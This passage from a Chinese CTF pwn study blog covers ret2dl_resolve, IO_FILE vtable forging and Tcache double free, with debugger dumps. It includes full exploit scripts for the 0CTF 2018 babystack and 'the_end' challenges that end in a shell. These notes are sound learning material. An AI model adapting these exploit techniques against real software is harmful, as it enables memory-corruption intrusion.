-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/20gx 0x00007ffff7ffe140<br>0x7ffff7ffe140 &lt;_r_debug&gt;:	0x0000000000000001	0x00007ffff7ffe170<br>0x7ffff7ffe150 &lt;_r_debug+16&gt;:	0x00007ffff7de3f40	0x0000000000000000<br>0x7ffff7ffe160 &lt;_r_debug+32&gt;:	0x00007ffff7dd3000	0x0000000000000000<br>0x7ffff7ffe170:	0x0000000000000000	0x00007ffff7ffe700<br>0x7ffff7ffe180:	0x0000000000600e20	0x00007ffff7ffe710<br>0x7ffff7ffe190:	0x0000000000000000	0x00007ffff7ffe170<br>0x7ffff7ffe1a0:	0x0000000000000000	0x00007ffff7ffe6e8<br>0x7ffff7ffe1b0:	0x0000000000000000	0x0000000000600e20<br>0x7ffff7ffe1c0:	0x0000000000600f00	0x0000000000600ef0<br>0x7ffff7ffe1d0:	0x0000000000000000	0x0000000000600ea0<br><br></code></pre></td></tr></table></figure>
-
-<p><code>r_debug</code>维护的第一个结构体，也就是<code>link_map</code>地址，即<code>0x00007ffff7ffe170</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">0x7ffff7ffe140 &lt;_r_debug&gt;:	0x0000000000000001	0x00007ffff7ffe170<br></code></pre></td></tr></table></figure>
-
-<p>这样我们就从<code>dt_debug</code>找到了<code>link_map</code>的地址。</p>
-<p>虽然但是。</p>
-<p>只是找到<code>link_map</code>没啥用。</p>
-<p>我们的最终目的还是寻找到<code>dl_runtime_resolve</code>函数的地址，当地址被找到那么之后的操作就是常规的ret2dl了。</p>
-<p>能从动态链接库中找到<code>dl_runtime_resolve</code>函数地址的原理大致是Full RELRO保护只对main excutable生效，而动态链接库并不受它保护。这就意味着我们如果能够通过动态链接库来找到<code>dl_runtime_resolve</code>函数地址，那么问题就迎刃而解了。</p>
-<p>那么如何寻找呢？</p>
-<p>实际比较简单（无aslr的情况），只要根据<code>link_map</code>的结构依次顺下来就好了。</p>
-<p>上一个section我们找到了<code>link_map</code>的地址，接下来我们通过<code>link_map</code>逐步找到</p>
-<p><code>dl_runtime_resolve</code>。</p>
-<p>首先我们找到<code>libc.so.6</code>文件。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/20gx 0x00007ffff7ffe170<br>0x7ffff7ffe170:	0x0000000000000000	0x00007ffff7ffe700<br>0x7ffff7ffe180:	0x0000000000600e20	0x00007ffff7ffe710<br>---<br>pwndbg&gt; x/20gx 0x00007ffff7ffe700<br>0x7ffff7ffe700:	0x0000000000000000	0x0000000000000000<br>0x7ffff7ffe710:	0x00007ffff7ffb000	0x00007ffff7ffebb0<br>---<br>pwndbg&gt; x/s 0x00007ffff7ffebb0<br>0x7ffff7ffebb0:	<span class="hljs-string">&quot;linux-vdso.so.1&quot;</span><br>---<br>pwndbg&gt; x/10gx 0x00007ffff7ffe710<br>0x7ffff7ffe710:	0x00007ffff7ffb000	0x00007ffff7ffebb0<br>0x7ffff7ffe720:	0x00007ffff7ffb3a0	0x00007ffff7fe2000<br>---<br>pwndbg&gt; x/10gx 0x00007ffff7fe2000<br>0x7ffff7fe2000:	0x00007ffff79e2000	0x00007ffff7ffedd0<br>---<br>pwndbg&gt; x/s 0x00007ffff7ffedd0<br>0x7ffff7ffedd0:	<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br><br></code></pre></td></tr></table></figure>
-
-<p>即<code>0x00007ffff7ffedd0</code>。</p>
-<p>0x3即<code>GOT[]</code>入口</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/30gx 0x00007ffff7dccb80<br>...<br>0x7ffff7dccc30:	0x0000000000000003	0x00007ffff7dcd000<br><br></code></pre></td></tr></table></figure>
-
-<p>找到GOT[3]</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/5gx 0x00007ffff7dcd000<br>0x7ffff7dcd000:	0x00000000003eab80	0x00007ffff7fe2000<br>0x7ffff7dcd010:	0x00007ffff7dea8f0	0x00007ffff7b70a10<br></code></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; xinfo 0x00007ffff7dea8f0<br>Extended information <span class="hljs-keyword">for</span> virtual address 0x7ffff7dea8f0:<br><br>  Containing mapping:<br>    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000 0      /lib/x86_64-linux-gnu/ld-2.27.so<br><br>  Offset information:<br>         Mapped Area 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0<br>         File (Base) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0<br>      File (Segment) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0<br>         File (Disk) 0x7ffff7dea8f0 = /lib/x86_64-linux-gnu/ld-2.27.so + 0x178f0<br><br> Containing ELF sections:<br>               .text 0x7ffff7dea8f0 = 0x7ffff7dd3f10 + 0x169e0<br><br></code></pre></td></tr></table></figure>
-
-<h3 id="3）exploitation"><a href="#3）exploitation" class="headerlink" title="3）exploitation"></a>3）exploitation</h3><p>在无aslr并已经获取到<code>dl_runtime_resolve</code>的情况下的利用和patial relro相似。</p>
-<p>有aslr的情况。。</p>
-<p>我也不会。</p>
-<h3 id="4-refrence"><a href="#4-refrence" class="headerlink" title="4)refrence"></a>4)refrence</h3><p><a href="http://rk700.github.io/2015/04/09/dt_debug-read/">通过DT_DEBUG来获得各个库的基址</a></p>
-<p><a href="https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/di-frederico">How the ELF Ruined Christmas</a></p>
-<p><a href="https://ypl.coffee/dl-resolve-full-relro/">Finding link_map and _dl_runtime_resolve() under full RELRO</a></p>
-<p>————————————————tbc——————————————————-</p>
-]]></content>
-      <tags>
-        <tag>stack</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>0CTF_2018_babystack</title>
-    <url>/2021/08/02/0CTF2018-babystack/</url>
-    <content><![CDATA[<h2 id="1-review"><a href="#1-review" class="headerlink" title="1)review"></a>1)review</h2><p>作为ret2dl的复习题。</p>
-<h2 id="2）exploitation"><a href="#2）exploitation" class="headerlink" title="2）exploitation"></a>2）exploitation</h2><p>溢出0x28+0x4字节，但是由于rop空间太小需要栈迁移。</p>
-<p>并且没有aslr，relro为partial。</p>
-<p>非常典型的ret2dl。</p>
-<h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>可以直接用roputils做</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> roputils<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>offset = <span class="hljs-number">44</span><br>readplt = <span class="hljs-number">0x08048300</span><br>bss = <span class="hljs-number">0x0804a020</span><br>vulFunc = <span class="hljs-number">0x0804843B</span><br><br>p = process(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getReloc</span>(<span class="hljs-params">elf, base</span>):</span><br>    jmprel = elf.dynamic(<span class="hljs-string">&#x27;JMPREL&#x27;</span>)<br>    relent = elf.dynamic(<span class="hljs-string">&#x27;RELENT&#x27;</span>)<br><br>    addr_reloc, padlen_reloc = elf.align(base, jmprel, relent)<br>    reloc_offset = addr_reloc - jmprel<br>    <span class="hljs-keyword">return</span> reloc_offset<br><br>rop = roputils.ROP(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br>addr_bss = rop.section(<span class="hljs-string">&#x27;.bss&#x27;</span>)<br><br><span class="hljs-comment"># step1 : write sh &amp; resolve struct to bss</span><br>buf1 = <span class="hljs-string">b&#x27;A&#x27;</span> * offset <span class="hljs-comment">#44</span><br>buf1 += p32(readplt) + p32(vulFunc) + p32(<span class="hljs-number">0</span>) + p32(addr_bss) + p32(<span class="hljs-number">100</span>)<br>p.send(buf1)<br><br>buf2 =  rop.string(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>buf2 += rop.fill(<span class="hljs-number">20</span>, buf2)<br>buf2 += rop.dl_resolve_data(addr_bss+<span class="hljs-number">20</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br>buf2 += rop.fill(<span class="hljs-number">100</span>, buf2)<br>p.send(buf2)<br><br><span class="hljs-comment">#step2 : use dl_resolve_call get system &amp; system(&#x27;/bin/sh&#x27;)</span><br>buf3 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">44</span> + rop.dl_resolve_call(addr_bss+<span class="hljs-number">20</span>, addr_bss)<br>p.send(buf3)<br>p.interactive()<br></code></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>stack</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>patch&#39;alarm</title>
-    <url>/2021/08/03/patch%20alarm/</url>
-    <content><![CDATA[<p>比较弱智的一个操作，但是如果没注意到的话还是有一点点坑。</p>
-<p>一般来说许多题都喜欢在main函数里加alarm。</p>
-<p>alarm会导致调试的时候超时，如果没有解决的话基本不能调试。算最基础的的反调试手法了。</p>
-<p>ps:关于超时的那个报错当时还好好研究了一会儿来着。就是一个sigxxx，sigalarm好像，然后默认返回中止程序。</p>
-<p>解决方案也比较弱智。就是直接patch掉就好了。</p>
-<p>ida都关了懒得上图了。</p>
-]]></content>
-      <tags>
-        <tag>mess</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>roputils使用tips</title>
-    <url>/2021/08/03/roputils/</url>
-    <content><![CDATA[<p>做ret2dl的时候难免会偷懒使用工具。</p>
-<p>但是这个工具并没有看起来那么和善。</p>
-<p>就怎么使用utils包我都研究了一会儿，然后发现只需要<code>import roputils</code>然后把相对应的那个py脚本放到同一路径下就好。</p>
-<p>但是紧接着第二问个问题，这个py脚本通篇是python2，而我日常无论哪个系统都是py3。</p>
-<p>所以解决方式有2</p>
-<ol>
-<li> 将roputils转换为py3</li>
-<li>ubuntu切换py版本</li>
-</ol>
-<p>反正第一种就是用一个叫2to3的脚本。是py2自带的，使用需要先安装py2.7，我ubuntu18.04自带py2.7，所以就直接<code>2to3 -w roputils.py</code></p>
-<p>具体参数可以google。</p>
-<p>然后又来了第三个问题。</p>
-<p>来看我的报错。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">[+] Starting local process <span class="hljs-string">&#x27;./babystack&#x27;</span>: pid <span class="hljs-number">745</span><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;babystack.py&quot;</span>, line <span class="hljs-number">23</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    rop = roputils.ROP(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br>  File <span class="hljs-string">&quot;/home/fur1n/pwn/week1/roputils.py&quot;</span>, line <span class="hljs-number">440</span>, <span class="hljs-keyword">in</span> __init__<br>    ELF.__init__(self, *args, **kwargs)<br>  File <span class="hljs-string">&quot;/home/fur1n/pwn/week1/roputils.py&quot;</span>, line <span class="hljs-number">85</span>, <span class="hljs-keyword">in</span> __init__<br>    m = re.search(<span class="hljs-string">r&#x27;^\s*(?P&lt;key&gt;[^:]+):\s+(?P&lt;value&gt;.+)$&#x27;</span>, line)<br>  File <span class="hljs-string">&quot;/usr/lib/python3.6/re.py&quot;</span>, line <span class="hljs-number">182</span>, <span class="hljs-keyword">in</span> search<br>    <span class="hljs-keyword">return</span> _<span class="hljs-built_in">compile</span>(pattern, flags).search(string)<br>TypeError: cannot use a string pattern on a <span class="hljs-built_in">bytes</span>-like <span class="hljs-built_in">object</span><br></code></pre></td></tr></table></figure>
-
-<p>这个功能好像并不会在byte前加b。。。</p>
-<p>目前来说并没有发现解决方法。</p>
-<p>所以只能尝试更换默认的py版本。具体可以google</p>
-]]></content>
-      <tags>
-        <tag>mess</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>IO_FILE学习</title>
-    <url>/2021/08/09/io_file/</url>
-    <content><![CDATA[<p>io_file学习笔记</p>
-<h3 id="0）review"><a href="#0）review" class="headerlink" title="0）review"></a>0）review</h3><p>glibc定义了<code>_IO_FILE</code>这样一个结构体来管理io file。io_file结构体里定义了一堆相关的变量，但是真正关键的是其中包含的<code>_IO_FILE_plus</code>结构</p>
-<p>结构源码如下</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>    _IO_FILE    file;<br>    IO_jump_t   *vtable;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>这个结构包含了一个叫<code>vtable</code>的指针，指向实现io函数各种功能的真正函数。</p>
-<p>以fread为例子简述io_file结构调用的流程</p>
-<h4 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h4><p>fread真正功能的实现在子函数<code>_IO_sgetn</code>中。</p>
-<p>下面是<code>_IO_sgetn</code>的源码。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_sgetn (fp, data, n)<br>     _IO_FILE *fp;<br>     <span class="hljs-keyword">void</span> *data;<br>     _IO_size_t n;<br>&#123;<br>  <span class="hljs-keyword">return</span> _IO_XSGETN (fp, data, n);<br>&#125;<br></code></pre></td></tr></table></figure>
-
-
-
-<p>实际上也是先定义一堆变量然后内部再调用另外一个函数。</p>
-<p>也就是<code>_IO_XSGETN</code>。</p>
-<p>这个函数并不简单，它是<code>_IO_FILE_plus.vtable</code> 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。</p>
-<p>vtable也是一个指针，指向结构体<code>_IO_jump_t</code></p>
-<p><code>_IO_jump_t</code>源码如下</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-keyword">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-keyword">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> 0</span><br>    get_column;<br>    set_column;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure>
-
-<p>这里vtable就像一个中转站，通过它调用<code>_IO_jump_t</code>中的各种函数。</p>
-<p>比如说这里fread就是调用的<code>_IO_file_xsgetn</code>函数。</p>
-<p>值得注意的是调用这个函数之前需要把它从vtable中取出从，然后才跳过去调用。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>        &amp;&amp; want &lt; (<span class="hljs-keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>      &#123;<br>        <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)<br>      <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">continue</span>;<br>      &#125;<br></code></pre></td></tr></table></figure>
-
-
-
-<p>函数源码如上，实现的是一个键盘输入。 </p>
-<p>实际上orw三个功能的原理都差不多，都是经过vtable指针调用函数。只是最后的功能有区别而已。</p>
-<h3 id="伪造vtable"><a href="#伪造vtable" class="headerlink" title="伪造vtable"></a>伪造vtable</h3><p>在刚在的fread调用分析中我们认识到vtable实际上就是一个中转站，如果我们能够控制这个中转站的内容，我们也就相应地能够控制程序进行一些奇怪的操作了。</p>
-<p>那么应该如何伪造vtable呢？<br>目前有两种思路。</p>
-<p>一种是直接修改vtable中的指针，进行一个任意地址读写，第二种是覆盖 vtable 的指针，使其指向一段可控的内存空间，也就相当于伪造vtable。</p>
-<p>在libc2.23以后的版本vtable不能被直接写入数据，所以只能用第二种方法–伪造vtable。</p>
-<p>但是我们先从第一个方法来试一试。</p>
-<p>示例来源于ctf-wiki</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE *fp;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *vtable_ptr;<br>    fp=fopen(<span class="hljs-string">&quot;123.txt&quot;</span>,<span class="hljs-string">&quot;rw&quot;</span>);<br>    vtable_ptr=*(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)fp+<span class="hljs-number">0xd8</span>);     <span class="hljs-comment">//get vtable</span><br><br>    vtable_ptr[<span class="hljs-number">7</span>]=<span class="hljs-number">0x41414141</span> <span class="hljs-comment">//xsputn</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;call 0x41414141&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>这边利用的具体步骤比较直观。</p>
-<p>遍历 <code>_IO_list_all</code> ，然后调用 <code>_IO_2_1_stdout_</code> 下的 <code>vtable</code> 中 <code>_setbuf</code> 函数。</p>
-<p>承接上文的思路，我们需要在某个可控内存伪造vtable，然后修改_setbuf函数为关键内容。</p>
-<p>在这道题中，我们可以在vtable附近修改两个字节构造fake vtable，然后利用三个字节改_setbuf为one_gadget。</p>
-<p>开头直接给出了sleep函数的真实地址，程序内存地址完全暴露，我们可以通过它找到exit调用的stdout的地址。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; <span class="hljs-built_in">print</span> _IO_2_1_stdin_<br><span class="hljs-variable">$2</span> = &#123;<br>  file = &#123;<br>    _flags = -72540024, <br>    _IO_read_ptr = 0x0, <br>    _IO_read_end = 0x0, <br>    _IO_read_base = 0x0, <br>    _IO_write_base = 0x0, <br>    _IO_write_ptr = 0x0, <br>    _IO_write_end = 0x0, <br>    _IO_buf_base = 0x0, <br>    _IO_buf_end = 0x0, <br>    _IO_save_base = 0x0, <br>    _IO_backup_base = 0x0, <br>    _IO_save_end = 0x0, <br>    _markers = 0x0, <br>    _chain = 0x0, <br>    _fileno = 0, <br>    _flags2 = 0, <br>    _old_offset = -1, <br>    _cur_column = 0, <br>    _vtable_offset = 0 <span class="hljs-string">&#x27;\000&#x27;</span>, <br>    _shortbuf = <span class="hljs-string">&quot;&quot;</span>, <br>    _lock = 0x7ffff7dcf8d0 &lt;_IO_stdfile_0_lock&gt;, <br>    _offset = -1, <br>    _codecvt = 0x0, <br>    _wide_data = 0x7ffff7dcdae0 &lt;_IO_wide_data_0&gt;, <br>    _freeres_list = 0x0, <br>    _freeres_buf = 0x0, <br>    __pad5 = 0, <br>    _mode = 0, <br>    _unused2 = <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="hljs-built_in">times</span>&gt;<br>  &#125;, <br>  vtable = 0x7ffff7dca2a0 &lt;_IO_file_jumps&gt;<br>&#125;<br><br></code></pre></td></tr></table></figure>
-
-<p>我们可以看到vtable的地址是0x7ffff7dca2a0。</p>
-<p>然后我们需要在它附近伪造一个vtable。</p>
-<ol>
-<li>伪造的vtable需要符合以下条件：<br>1:<code>fake_vtable + 0x58</code>=<code>libc_base+off_3</code></li>
-</ol>
-<p>完整exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br>libc=ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span>)<br>p = process(<span class="hljs-string">&#x27;the_end&#x27;</span>)<br><br>libc_base = long(sleep_ad,<span class="hljs-number">16</span>) - libc.symbols[<span class="hljs-string">&#x27;sleep&#x27;</span>]<br>one_gadget = libc_base + <span class="hljs-number">0xf02b0</span><br>vtables =     libc_base + <span class="hljs-number">0x3C56F8</span><br><br>fake_vtable = libc_base + <span class="hljs-number">0x3c5588</span><br>target_addr = libc_base + <span class="hljs-number">0x3c55e0</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>    p.send(p64(vtables+i))<br>    p.send(p64(fake_vtable)[i])<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    p.send(p64(target_addr+i))<br>    p.send(p64(one_gadget)[i])<br><br>p.sendline(<span class="hljs-string">&quot;exec /bin/sh 1&gt;&amp;0&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
-
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>伪造vtable算是io_file中比较简单好懂的一点了，只要对数据结构稍微熟悉一点就能很快理解。然后伪造的方式和思路也比较直接，可以说是经典pwn思路了////</p>
-<p>下一章我们将学习FSOP，感觉难度会比伪造vtable高出不少，其实只要沉下心来看都不难，最难的目前来说还是那些高版本的防护的绕过了。</p>
-<h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>上一part我们学习了如何通过伪造vtable加上打one_gsdget来getshell，理解起来比较简单，实际操作也并不复杂，只要能找到fake vtable的位置并且正确理解one gadget的用法就好。</p>
-<p>这一个part我们学习FSOP。</p>
-<p>ps：不管是fsop还是后面的glibc2.24下的伪造vtable在ctf中的考察都较少。但是不能说不重要吧///</p>
-<p>FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项</p>
-]]></content>
-      <tags>
-        <tag>other</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>调试器断点原理</title>
-    <url>/2021/08/10/%E8%B0%83%E8%AF%95%E5%99%A8%E6%96%AD%E7%82%B9%E5%8E%9F%E7%90%86/</url>
-    <content><![CDATA[<h2 id="1-review"><a href="#1-review" class="headerlink" title="1)review"></a>1)review</h2><p>夹带私货的科普文</p>
-<h3 id="2）调试器断点"><a href="#2）调试器断点" class="headerlink" title="2）调试器断点"></a>2）调试器断点</h3><p>　　调试器可以给程序打断点是怎么回事呢？调试器相信大家都很熟悉，但是调试器可以给程序打断点是怎么回事呢，下面就让小编带大家一起了解吧。<br>　　调试器可以给程序打断点，其实就是程序以为自己出错了，大家可能会很惊讶程序怎么可能以为自己会出错呢？但事实就是这样，小编也感到非常惊讶。<br>　　这就是关于调试器可以给程序打断点的事情了，大家有什么想法呢，欢迎在评论区告诉小编一起讨论哦！</p>
-]]></content>
-      <tags>
-        <tag>mess</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Tcahce学习</title>
-    <url>/2021/08/17/Heap%E2%80%94%E2%80%94Tcache%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="Tcahce学习"><a href="#Tcahce学习" class="headerlink" title="Tcahce学习"></a>Tcahce学习</h1><h2 id="0）review"><a href="#0）review" class="headerlink" title="0）review"></a>0）review</h2><p>说是Tcache学习，实际上是lonelywolf的复现。</p>
-<p>网上wp都是神仙写的，一点也不萌新友好。我都看不懂（）</p>
-<p>打开题发现这个菜单题好常规。</p>
-<p>但是libc是2.27，难度会稍微高一点。而且这个2.27是魔改过的，加入了2.29才有的key，为Tcache加入了检查机制。                                                                                                   具体的参考可以看<a href="https://blog.csdn.net/chennbnbnb/article/details/109284780">glibc2.31下的新double free手法/字节跳动pwn题gun题解</a>。但是在这道题里面充其量算一个trick而不是核心考点。</p>
-<h2 id="1）漏洞点"><a href="#1）漏洞点" class="headerlink" title="1）漏洞点"></a>1）漏洞点</h2><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 <span class="hljs-title">delete</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 v1; <span class="hljs-comment">// [rsp+0h] [rbp-18h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-10h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  __printf_chk(<span class="hljs-number">1LL</span>, <span class="hljs-string">&quot;Index: &quot;</span>);<br>  __isoc99_scanf(&amp;number, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( !v1 &amp;&amp; buf )<br>    <span class="hljs-built_in">free</span>(buf);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>漏洞点。经典uaf。</p>
-<p>之前看wp有人说edit函数里面有空字节溢出，问题大概出在++v == v1上，正确写法应该是v0++，不然判断结束但是v0多加了一次。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>        &#123;<br>          read(<span class="hljs-number">0</span>, v0, <span class="hljs-number">1uLL</span>);<br>          <span class="hljs-keyword">if</span> ( *v0 == <span class="hljs-string">&#x27;\n&#x27;</span> )<br>            <span class="hljs-keyword">break</span>;<br>          <span class="hljs-keyword">if</span> ( ++v0 == v1 )<br>            <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>        &#125;<br>        *v0 = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure>
-
-<p>然后有一个比较怪的点就是这里的 <code> __readfsqword();</code>。很明显他是一个和读取有关的函数，但是ida根本点不进去。</p>
-<p>后面我才知道这个函数是和canary保护有关。</p>
-<p>根据微软官方文档<a href="https://docs.microsoft.com/en-us/cpp/intrinsics/readfsbyte-readfsdword-readfsqword-readfsword?view=msvc-160">…</a>这个函数的功能是【通过FS段开头的偏移来读取内存中的数据】，这里的FS段是段寄存器。定义大概是运行时被赋予功能，然后在64位win下指向运行中的os的被定义的结构，被os用来加载特定线程段内存数据。</p>
-<p>但是好像说了和没说一样。</p>
-<p>回到汇编语言的界面，似乎找到点不进去的原因了。具体的内容还是要码住。<a href="https://toutiao.io/posts/o5yed8w/preview">Canary安全机制原理实战分析</a></p>
-<p>![image-20210811161707509](/Users/rin/Library/Application Support/typora-user-images/image-20210811161707509.png)</p>
-<h2 id="2）漏洞利用"><a href="#2）漏洞利用" class="headerlink" title="2）漏洞利用"></a>2）漏洞利用</h2><h3 id="1）Tcache-double-free"><a href="#1）Tcache-double-free" class="headerlink" title="1）Tcache double free"></a>1）Tcache double free</h3><p>之前也说过了，这个libc是魔改过的，增加了2.29才有的key，所以需要绕过。</p>
-<p>虽然但是，我连普通的Tcache的题都不太清楚，正好找到一个讲得特别详细的视频，那就跟着做好了，顺便复习一下。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">0</span>)<br>gdb.attach(p)<br>pause()<br></code></pre></td></tr></table></figure>
-
-
-
-<p>首先先分配再释放一下，看看这个题具体的内存分布有什么特点。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs c#">pwndbg&gt; hea<br>Allocated chunk | PREV_INUSE<br>Addr: 0x55e9c994c000<br>Size: 0x251<br><br>Free chunk (tcache) | PREV_INUSE<br>Addr: 0x55e9c994c250<br>Size: 0x71<br>fd: 0x00<br><br>Top chunk | PREV_INUSE<br>Addr: 0x55e9c994c2c0<br>Size: 0x20d41<br><br>pwndbg&gt; bin<br>tcachebins<br>0x70 [  1]: 0x55e9c994c260 ◂— 0x0<br>fastbins<br>0x20: 0x0<br>0x30: 0x0<br>0x40: 0x0<br>0x50: 0x0<br>0x60: 0x0<br>0x70: 0x0<br>0x80: 0x0<br>unsortedbin<br>all: 0x0<br>smallbins<br>empty<br>largebins<br>empty<br><br></code></pre></td></tr></table></figure>
-
-<p>之前一直不是很清楚</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x55e9c994c000</span><br>Size: <span class="hljs-number">0x251</span><br></code></pre></td></tr></table></figure>
-
-<p>这个堆块的作用，之前问学委，学委说是一些被缓存的函数啥的？？实际上是tcache的控制区域。大概就是保存Tcache chunk的一些信息。</p>
-<p>然后这边</p>
